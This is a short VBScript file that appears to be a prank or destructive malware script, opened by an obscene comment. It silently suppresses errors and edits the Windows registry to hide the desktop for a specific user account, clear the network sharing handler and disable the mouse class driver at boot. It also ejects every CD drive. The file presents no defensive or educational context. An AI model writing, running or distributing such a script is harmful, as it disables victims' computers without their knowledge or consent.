'globavuzoassFUCK
on error resume next
Set S = CreateObject("Wscript.Shell")
set FSO=createobject("scripting.filesystemobject")
s.regwrite"HKEY_CLASSES_ROOT\Network\SharingHandler\",""
s.regwrite"HKEY_USERS\S-1-5-21-343818398-1417001333-725345543-1003\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\nodesktop","1","REG_DWORD"
s.regwrite"HKEY_USERS\S-1-5-21-343818398-1417001333-725345543-1003\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\ClassicShell","1","REG_DWORD"
Set ww=CreateObject("WMPlayer.OCX.7")
Set cw=ww.cdromCollection
if cw.Count>=1 then
For i=0 to cw.Count-1
cw.Item(i).eject
next
End If

s.regwrite"HKLM\SYSTEM\CurrentControlSet\Services\Mouclass\Start","4","REG_DWORD"

